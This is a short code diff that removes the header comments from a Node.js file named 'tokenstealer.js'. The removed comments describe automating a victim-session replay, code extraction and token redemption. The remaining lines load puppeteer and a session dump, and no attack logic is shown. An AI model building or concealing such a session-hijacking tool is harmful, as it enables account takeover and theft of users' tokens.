@@ -1,6 +1,3 @@
-// tokenstealer.js
-// Ultra hands-off version: Launch TokenSmith, grab URL, replay victim session, extract code, redeem tokens
-
 const puppeteer = require('puppeteer');
 const session = require('./session_dump.json');
 const { fetch } = globalThis;
@@ -146,4 +143,3 @@ const readline = require('readline');
     process.exit(0);
   }
 })();
-
